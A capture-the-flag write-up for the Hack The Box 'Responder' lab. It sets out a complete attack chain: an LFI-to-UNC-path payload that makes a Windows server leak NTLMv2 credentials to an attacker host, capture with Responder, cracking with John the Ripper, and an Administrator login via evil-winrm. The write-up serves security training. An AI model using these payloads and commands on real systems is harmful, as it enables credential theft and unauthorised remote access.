# Hack The Box — Responder Write-Up

## Machine Information
- **Name:** Responder
- **Difficulty:** Very Easy
- **Operating System:** Windows
- **Category:** Network / Authentication

---

## Objective
The goal of this machine is to understand how Windows name resolution and NTLM authentication can be abused to leak credentials, and how those credentials can later be used to gain remote access.

---

## Enumeration

### Port Scan
```bash
nmap -sC -sV IP
```

Relevant open ports:
- **80/tcp** – Web application
- **5985/tcp** – WinRM (Windows Remote Management)
- **7680/tcp** – Windows Delivery Optimization

---

## Web Application Analysis

The web application uses a URL parameter to load different language pages.

Example:
```
?page=english
```

This parameter is vulnerable to **Local File Inclusion (LFI)**. Because the server is running on Windows, it is possible to supply a **UNC path** instead of a local file.

Example payload:
```
\\IP\share
```

When this payload is processed, the Windows server attempts to authenticate to the specified network resource.

---

## Why Responder Works Here

Windows systems use several name resolution and authentication mechanisms such as:
- LLMNR
- NBT-NS
- NTLM authentication

When the server tries to access a UNC path, it automatically sends NTLM authentication data over the network. If an attacker is listening and pretending to be that resource, the credentials can be captured.

**Responder** is used to:
- Listen for name resolution requests
- Pretend to be a legitimate network service
- Capture NTLMv2 authentication hashes

---

## NTLM Hash Capture with Responder

Responder was started on the attacker's machine using the VPN interface:

```bash
sudo responder -I tun0
```

After triggering the LFI with the UNC path, Responder captured an NTLMv2 authentication attempt:

```
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:...
```

This confirms that credential capture was successful.

---

## Password Cracking

The captured NTLMv2 hash was cracked using John the Ripper:

```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The plaintext password for the `Administrator` account was recovered.

---

## Gaining Access via WinRM (5985)

Since WinRM was enabled on the target system, the recovered credentials were used to gain remote access:

```bash
evil-winrm -i IP -u Administrator -p PASSWORD
```

A successful WinRM session was established.

---

## Flag

After logging in, the flag was retrieved:

```powershell
type flag.txt
```

✅ Flag successfully obtained.

---

## Key Takeaways

- LFI vulnerabilities can be abused to trigger outbound authentication
- Windows automatically sends NTLM credentials when accessing network resources
- Responder can capture NTLMv2 hashes from misconfigured environments
- Cracked credentials can be reused for WinRM access

---

## Conclusion

The Responder machine is a **Very Easy** lab designed to demonstrate how simple web vulnerabilities combined with Windows authentication mechanisms can lead to full system compromise. It provides an excellent introduction to NTLM-based attacks and credential abuse in Windows environments.

